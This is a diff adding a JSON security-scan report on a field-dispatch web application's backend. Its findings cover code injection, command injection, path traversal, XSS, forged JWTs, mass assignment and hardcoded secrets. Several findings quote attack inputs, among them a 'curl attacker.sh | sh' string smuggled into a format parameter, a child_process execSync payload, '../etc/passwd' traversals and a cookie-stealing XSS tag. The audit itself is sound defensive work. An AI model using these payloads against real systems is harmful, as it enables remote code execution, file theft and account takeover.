@@ -1,0 +1,741 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.deserialization.node-v8-deserialize",
+      "path": "backend/src/routes/jobs.ts",
+      "start": {
+        "line": 52,
+        "col": 10,
+        "offset": 1920
+      },
+      "end": {
+        "line": 52,
+        "col": 29,
+        "offset": 1949
+      },
+      "extra": {
+        "message": "The base64 blob uploaded to POST /api/jobs/:id/checkpoint-sync (line 657, storeCheckpointSyncBlob) is deserialized with node:v8 deserialize() without any validation. v8 deserialization of attacker-controlled buffers can corrupt memory or execute arbitrary code (RCE). Any authenticated user can plant the blob \u2014 the field-worker assignment check at line 650 only applies to field_worker role, so even a customer can store it for any job \u2014 and it is deserialized when a dispatcher/ops_admin calls GET /api/jobs/:id/checkpoint-sync (line 668).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-502: Deserialization of Untrusted Data"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.eval-new-function",
+      "path": "backend/src/routes/jobs.ts",
+      "start": {
+        "line": 189,
+        "col": 23,
+        "offset": 6399
+      },
+      "end": {
+        "line": 189,
+        "col": 96,
+        "offset": 6472
+      },
+      "extra": {
+        "message": "The user-supplied 'formula' query parameter (line 170) of GET /api/jobs/:id/custom-surcharge-quote is interpolated into a new Function() constructor: new Function('baseRate','distanceMiles', `return (${formula});`). This evaluates arbitrary JavaScript supplied by the caller (e.g. 'process.constructor(\"return process\")().mainModule.require(\"child_process\").execSync(\"...\")'), giving dispatchers/ops_admins remote code execution on the server. The safe twin calculateStandardSurchargeQuote (line 204) shows the intended approach of a fixed preset allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.os-command-execsync",
+      "path": "backend/src/routes/exports.ts",
+      "start": {
+        "line": 38,
+        "col": 21,
+        "offset": 1329
+      },
+      "end": {
+        "line": 40,
+        "col": 45,
+        "offset": 1441
+      },
+      "extra": {
+        "message": "In convertRouteSheetDocument (GET /api/exports/routes/:id/document), the 'format' query parameter is never validated and is interpolated into outputPath (line 38) which is then passed to execSync(`pandoc ${sourcePath} -o ${outputPath}`) at line 40. A format value such as 'pdf; curl attacker.sh | sh' or 'pdf$(id)' is executed by the shell, yielding unauthenticated-command OS command injection (RCE) for any dispatcher/ops_admin. The sibling handler convertIncidentReportDocument (line 97) correctly validates format against ALLOWED_ROUTE_SHEET_FORMATS, confirming the missing check is a vulnerability.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.jwt.unverified-token-decode",
+      "path": "backend/src/routes/carrierSync.ts",
+      "start": {
+        "line": 25,
+        "col": 5,
+        "offset": 1038
+      },
+      "end": {
+        "line": 25,
+        "col": 43,
+        "offset": 1081
+      },
+      "extra": {
+        "message": "handleResourceCheck (POST /api/cost-allocation/resource-check) 'verifies' the carrier token with fast-jwt's createDecoder() (line 9), which only base64-decodes the JWT and never checks the signature. Any unauthenticated caller can craft a token with arbitrary userId/carrierId claims (e.g. header.payload with no valid signature) and have it accepted; the forged claims are then written into the audit log (line 38). The sibling endpoint processAllocationExport (line 60) correctly uses createVerifier with HS256, confirming signature verification was intended here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.multipart-form-update",
+      "path": "backend/src/routes/workers.ts",
+      "start": {
+        "line": 110,
+        "col": 7,
+        "offset": 3682
+      },
+      "end": {
+        "line": 110,
+        "col": 20,
+        "offset": 3702
+      },
+      "extra": {
+        "message": "applyCertificationRenewalForm (PUT /api/workers/:id/certification-renewal) collects arbitrary multipart form fields (lines 100-105) with no schema/allowlist validation and spreads them directly into db.update(users).set({...formFields}) for ANY user id. A dispatcher can set any column on any user record \u2014 including role:'ops_admin', passwordHash, or isActive \u2014 giving privilege escalation and account takeover. Contrast the notification twin (notifications.ts lines 40-44) which allowlists keys before persisting.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.mass-assignment.cookie-json-update",
+      "path": "backend/src/routes/workers.ts",
+      "start": {
+        "line": 154,
+        "col": 7,
+        "offset": 4911
+      },
+      "end": {
+        "line": 154,
+        "col": 17,
+        "offset": 4928
+      },
+      "extra": {
+        "message": "applyDispatchBoardPreferences (PUT /api/workers/:id/board-preferences) JSON-parses the client-controlled 'board_layout' cookie (line 139-146) and spreads the parsed object directly into db.update(users).set({...restored}) on the caller's own user row. Any authenticated field worker can set arbitrary columns on their own account, e.g. {\"role\":\"ops_admin\"}, escalating to full administrator \u2014 a self-service privilege escalation via mass assignment.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.body-label-write",
+      "path": "backend/src/routes/routes.ts",
+      "start": {
+        "line": 49,
+        "col": 24,
+        "offset": 1679
+      },
+      "end": {
+        "line": 50,
+        "col": 36,
+        "offset": 1789
+      },
+      "extra": {
+        "message": "archiveRouteManifestBundle (POST /api/routes/:id/manifest-bundle) builds the output path with path.join(bundleDir, `${bundleLabel}.manifest.txt`) using the unvalidated 'bundleLabel' request-body field, then writes attacker-controlled 'content' with fs.writeFileSync. A bundleLabel like '../../etc/cron.d/pwn' escapes the uploads/exports directory and writes an arbitrary file anywhere the process can write (arbitrary file write \u2192 RCE). The safe twin archiveIncidentWriteup (incidents.ts line 94) sanitizes with path.basename(), confirming the missing sanitization here is a vulnerability.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.upload-filename-write",
+      "path": "backend/src/routes/proofs.ts",
+      "start": {
+        "line": 246,
+        "col": 22,
+        "offset": 8859
+      },
+      "end": {
+        "line": 249,
+        "col": 50,
+        "offset": 9022
+      },
+      "extra": {
+        "message": "POST /api/proofs/upload builds the stored filename as `${Date.now()}-${data.filename}` and writes it with createWriteStream(path.join(uploadDir, uniqueName)). The multipart 'filename' is fully client-controlled and may contain '../' segments (e.g. '../../../../etc/cron.d/x'), so path.join resolves outside the uploads/proofs directory, allowing any authenticated user to overwrite/create arbitrary files on the server (arbitrary file write \u2192 RCE).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.upload-filename-write",
+      "path": "backend/src/routes/imports.ts",
+      "start": {
+        "line": 41,
+        "col": 26,
+        "offset": 1457
+      },
+      "end": {
+        "line": 42,
+        "col": 60,
+        "offset": 1596
+      },
+      "extra": {
+        "message": "POST /api/imports/jobs saves the uploaded file to path.join(uploadDir, `${Date.now()}-${data.filename}`) and pipes it to createWriteStream. The multipart filename is client-controlled and can contain '../' path segments, allowing a dispatcher/ops_admin to write the uploaded file to an arbitrary location outside uploads/imports (arbitrary file write).",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.upload-filename-write",
+      "path": "backend/src/routes/imports.ts",
+      "start": {
+        "line": 276,
+        "col": 26,
+        "offset": 9348
+      },
+      "end": {
+        "line": 277,
+        "col": 60,
+        "offset": 9487
+      },
+      "extra": {
+        "message": "POST /api/imports/customers saves the uploaded CSV to path.join(uploadDir, `${Date.now()}-${data.filename}`) using the raw client-controlled multipart filename. A filename containing '../' traverses out of uploads/imports, allowing arbitrary file write on the server.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.query-param-read",
+      "path": "backend/src/routes/exports.ts",
+      "start": {
+        "line": 57,
+        "col": 28,
+        "offset": 2060
+      },
+      "end": {
+        "line": 57,
+        "col": 74,
+        "offset": 2134
+      },
+      "extra": {
+        "message": "loadRegionLetterheadFragment (GET /api/exports/routes/letterhead) joins the raw 'letterhead' query parameter into path.join(LETTERHEAD_DIR, `${letterhead}.html`) and reads the file with fs.readFileSync \u2014 no allowlist and no containment check. A value like '../../../etc/passwd' (or any traversal ending in .html) reads arbitrary files outside the letterheads directory. The safe twin loadInvoiceLetterheadFragment (lines 75-83) validates against ALLOWED_LETTERHEADS and checks startsWith(baseDir), confirming the missing validation is a vulnerability.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ssti-handlebars-compile",
+      "path": "backend/src/routes/messages.ts",
+      "start": {
+        "line": 166,
+        "col": 20,
+        "offset": 5775
+      },
+      "end": {
+        "line": 166,
+        "col": 44,
+        "offset": 5819
+      },
+      "extra": {
+        "message": "previewCannedReplyLayout (POST /api/messages/canned-reply-preview) compiles the user-supplied 'layout' string with Handlebars.compile(layout) and renders it. Compiling untrusted template input is server-side template injection (CWE-1336): Handlebars payloads can access template internals/prototype chains and, depending on engine hardening, achieve remote code execution or at minimum data manipulation and DoS. The safe twin sendStandardAcknowledgementReply (line 174) uses a fixed compiled layout, confirming user-supplied templates should never be compiled.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.weak-random-reset-token",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 30,
+        "col": 15,
+        "offset": 973
+      },
+      "end": {
+        "line": 30,
+        "col": 80,
+        "offset": 1053
+      },
+      "extra": {
+        "message": "sendEmailConfirmationCode (POST /api/auth/confirm-email) generates a security token with Math.random() \u2014 a non-cryptographic, predictable PRNG \u2014 producing only a 6-digit code (1,000,000 possibilities). The code is inserted into the password_reset_tokens table (line 33), the same table consumed by POST /api/auth/reset-password (line 243), and the code is never actually delivered (no email integration). With no rate limiting anywhere in the app, an attacker can request a confirmation code for a victim's email and brute-force the 6-digit token via /reset-password to reset the victim's password \u2014 a complete account-takeover chain. The forgot-password twin (line 221) correctly uses crypto.randomUUID().",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-330: Use of Insufficiently Random Values",
+            "CWE-307: Improper Restriction of Excessive Authentication Attempts"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.stored-html-widget",
+      "path": "backend/src/routes/customers.ts",
+      "start": {
+        "line": 184,
+        "col": 8,
+        "offset": 6152
+      },
+      "end": {
+        "line": 186,
+        "col": 38,
+        "offset": 6321
+      },
+      "extra": {
+        "message": "renderEmbeddableJobStatusWidget (GET /api/customers/:id/status-widget) responds with Content-Type text/html and interpolates customer.name and job fields directly into the HTML string with no escaping. customer.name is stored user input (set via POST/PUT /api/customers), so a name like '<img src=x onerror=alert(document.cookie)>' becomes stored XSS executing in any dispatcher/ops_admin browser that opens the widget URL.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.reflected-html-preview",
+      "path": "backend/src/routes/proofs.ts",
+      "start": {
+        "line": 98,
+        "col": 8,
+        "offset": 3693
+      },
+      "end": {
+        "line": 98,
+        "col": 99,
+        "offset": 3792
+      },
+      "extra": {
+        "message": "renderEmbeddableProofPreview (GET /api/proofs/:id/preview-embed) sends `<div class=\"proof-preview\"><h4>${proof.title || proof.fileName}</h4></div>` as text/html without any HTML escaping. proof.title is attacker-controlled (set at upload, line 219, or via PUT /api/proofs/:id), so a title containing '<script>...' executes as stored XSS in the QA/dispatcher viewer's session.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-filter",
+      "path": "backend/src/services/staffDirectory.ts",
+      "start": {
+        "line": 19,
+        "col": 20,
+        "offset": 853
+      },
+      "end": {
+        "line": 19,
+        "col": 56,
+        "offset": 909
+      },
+      "extra": {
+        "message": "searchStaff interpolates the raw search term into the LDAP filter `(cn=*${searchTerm}*)` with no escaping. The 'q' query parameter from GET /api/customers/staff-directory flows directly in (customers.ts line 31). LDAP metacharacters ( ) \\ * allow filter manipulation/injection (e.g. '*)(objectClass=*)(') to alter query scope and enumerate the corporate directory. The sibling method findUserByEmail (line 26) correctly escapes input with escapeLdapFilter(), confirming escaping was intended here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.stack-trace",
+      "path": "backend/src/routes/jobs.ts",
+      "start": {
+        "line": 157,
+        "col": 5,
+        "offset": 5223
+      },
+      "end": {
+        "line": 158,
+        "col": 72,
+        "offset": 5327
+      },
+      "extra": {
+        "message": "getJobDetail's catch block returns err.message and the full err.stack to the client whenever the 'verbosity' query parameter equals 'full' (reply.status(500).send({ error: err.message, stack: err.stack })). Any authenticated user can append ?verbosity=full to leak internal stack traces, file paths, library versions, and raw database/driver error details, aiding further attacks.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information",
+            "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.secrets.default-jwt-secret",
+      "path": "backend/src/config.ts",
+      "start": {
+        "line": 6,
+        "col": 3,
+        "offset": 222
+      },
+      "end": {
+        "line": 6,
+        "col": 85,
+        "offset": 307
+      },
+      "extra": {
+        "message": "The JWT signing secret falls back to the hardcoded value 'dev-jwt-secret-change-in-production' when JWT_SECRET is not set. This value is committed to the repository, so anyone who reads the source can forge valid session tokens for any user/role (including ops_admin) if the deployment does not override the environment variable \u2014 complete authentication bypass. There is no startup check that a real secret is configured.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.secrets.hardcoded-crypto-key",
+      "path": "backend/src/routes/proofs.ts",
+      "start": {
+        "line": 20,
+        "col": 1,
+        "offset": 629
+      },
+      "end": {
+        "line": 20,
+        "col": 135,
+        "offset": 764
+      },
+      "extra": {
+        "message": "The AES-256 key used to decrypt 'offline signature capture' blobs is derived from SIGNATURE_CAPTURE_SECRET with a hardcoded fallback 'field-dispatch-capture-secret'. If the env var is unset, the key is fully predictable from source: anyone can craft validly-encrypted payloads (forging e-signature evidence written to the proof record at line 58) or decrypt intercepted blobs, defeating the stated 'encrypted capture' control.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-321: Use of Hard-coded Cryptographic Key",
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.secrets.hardcoded-crypto-key",
+      "path": "backend/src/routes/incidents.ts",
+      "start": {
+        "line": 22,
+        "col": 1,
+        "offset": 673
+      },
+      "end": {
+        "line": 22,
+        "col": 130,
+        "offset": 803
+      },
+      "extra": {
+        "message": "The AES-256-GCM key for unsealing incident evidence captures falls back to the hardcoded string 'field-dispatch-evidence-secret' when EVIDENCE_SEAL_SECRET is unset. The key is derivable from public source code, so the evidence 'seal' provides no integrity guarantee: an attacker can forge sealed evidence blobs that the server decrypts and writes into the incident record (line 61).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-321: Use of Hard-coded Cryptographic Key",
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.token-in-log",
+      "path": "backend/src/routes/auth.ts",
+      "start": {
+        "line": 231,
+        "col": 5,
+        "offset": 7272
+      },
+      "end": {
+        "line": 231,
+        "col": 92,
+        "offset": 7364
+      },
+      "extra": {
+        "message": "The forgot-password handler logs the live password reset token to the console (console.log(`\ud83d\udd11 Password reset token for ${body.email}: ${token}`)). Reset tokens written to logs (which are commonly shipped to aggregators and readable by wider ops staff) can be replayed via /api/auth/reset-password to take over the account until the token expires.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-missing-role-check",
+      "path": "backend/src/routes/proofs.ts",
+      "start": {
+        "line": 169,
+        "col": 5,
+        "offset": 6354
+      },
+      "end": {
+        "line": 186,
+        "col": 6,
+        "offset": 6988
+      },
+      "extra": {
+        "message": "GET /api/proofs/:id/download performs an access check only for the 'customer' role (lines 169-186). Field workers are not verified against job assignment and dispatchers are not region-scoped, so any authenticated field_worker can download proof files (including internal_only visibility \u2014 the customer visibility filter does not apply to them) for jobs they are not assigned to by guessing proof IDs. Other handlers in the same file (reconcileOfflineSignatureCapture line 39, renderEmbeddableProofPreview line 87) correctly enforce canAccessJob, confirming this per-job authorization was omitted.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-missing-role-check",
+      "path": "backend/src/routes/proofs.ts",
+      "start": {
+        "line": 126,
+        "col": 5,
+        "offset": 4957
+      },
+      "end": {
+        "line": 142,
+        "col": 6,
+        "offset": 5591
+      },
+      "extra": {
+        "message": "GET /api/proofs/job/:jobId restricts results only for the 'customer' role (lines 126-142, filtering to customer_visible). Field workers and dispatchers receive every proof for any jobId with no check that the worker is assigned to the job or that the dispatcher owns the region \u2014 an IDOR exposing internal_only proof metadata (titles, file paths, uploader) across tenants.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.idor-missing-role-check",
+      "path": "backend/src/routes/messages.ts",
+      "start": {
+        "line": 35,
+        "col": 5,
+        "offset": 1099
+      },
+      "end": {
+        "line": 44,
+        "col": 6,
+        "offset": 1439
+      },
+      "extra": {
+        "message": "getJobMessageThread (GET /api/messages/job/:jobId) enforces ownership only for the 'customer' role (lines 35-44). Field workers are not checked against job assignment (contrast jobs.ts lines 84-87 which enforce it for job detail), so any authenticated field worker can read the full message thread \u2014 including isInternal dispatch notes \u2014 of any job by ID, and out-of-region dispatchers are likewise not scoped.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-639: Authorization Bypass Through User-Controlled Key",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.client-header-spoofing",
+      "path": "backend/src/routes/workers.ts",
+      "start": {
+        "line": 354,
+        "col": 9,
+        "offset": 11775
+      },
+      "end": {
+        "line": 355,
+        "col": 37,
+        "offset": 11874
+      },
+      "extra": {
+        "message": "recordDepotGateCheckIn authorizes restricted-bay access based on the client-supplied 'x-badge-clearance-tier' header parsed with parseInt() without a radix and compared with loose equality (clearanceTier == 3). parseInt('0x3') evaluates to 3 in hex form, so a forged header ('0x3', '3.0', ' 3') is accepted as tier 3 \u2014 an authentication/authorization decision (isRestrictedBay) trusted to a spoofable request header. The safe twin recordLoadingDockCheckIn (lines 386-387) parses with radix 10 and strict ===, confirming the depot-gate variant is the flaw.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-290: Authentication Bypass by Spoofing"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.unbounded-query",
+      "path": "backend/src/routes/customers.ts",
+      "start": {
+        "line": 68,
+        "col": 3,
+        "offset": 2362
+      },
+      "end": {
+        "line": 72,
+        "col": 45,
+        "offset": 2503
+      },
+      "extra": {
+        "message": "buildCustomerLedger (GET /api/customers/:id/full-ledger) selects every job for the customer with no LIMIT (the code comment itself notes 'tens of thousands of rows on file with no upper bound applied') and then issues an additional per-job worker query (N+1 amplification, lines 74-81). A dispatcher hitting a large legacy account causes unbounded memory/CPU/database consumption \u2014 uncontrolled resource consumption (CWE-400). The worker-history twin caps results with MAX_HISTORY_ROWS = 200 (workers.ts line 70).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.secrets.hardcoded-db-credentials",
+      "path": "backend/src/db/index.ts",
+      "start": {
+        "line": 9,
+        "col": 3,
+        "offset": 184
+      },
+      "end": {
+        "line": 9,
+        "col": 120,
+        "offset": 304
+      },
+      "extra": {
+        "message": "The runtime database connection string falls back to the hardcoded credentials 'postgresql://dispatch_user:dispatch_local_pass@localhost:5433/field_dispatch', committing a username and password to the repository. The same fallback also appears in config.ts:5, db/migrate.ts:10, and drizzle.config.ts.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.secrets.hardcoded-seed-password",
+      "path": "backend/src/db/seed.ts",
+      "start": {
+        "line": 90,
+        "col": 3,
+        "offset": 2363
+      },
+      "end": {
+        "line": 90,
+        "col": 59,
+        "offset": 2422
+      },
+      "extra": {
+        "message": "The seed script assigns every seeded account (admin@dispatch.local, dispatchers, workers, customers) the same hardcoded password 'password123'. If a seeded environment is ever exposed, all accounts \u2014 including the ops_admin \u2014 are trivially compromisable with a committed credential.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-259: Use of Hard-coded Password"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.storage.token-localstorage",
+      "path": "frontend/src/stores/auth.ts",
+      "start": {
+        "line": 27,
+        "col": 5,
+        "offset": 1167
+      },
+      "end": {
+        "line": 27,
+        "col": 55,
+        "offset": 1222
+      },
+      "extra": {
+        "message": "The login and register flows store the raw JWT in localStorage (localStorage.setItem('auth_token', data.token); also lines 39, 59, 89). localStorage is readable by any JavaScript running on the page, so any XSS (e.g. via the stored-XSS endpoints in this backend) would leak the session token, even though the server also sets a safer httpOnly cookie. Sensitive session material should not be kept in web storage.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-922: Insecure Storage of Sensitive Information"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
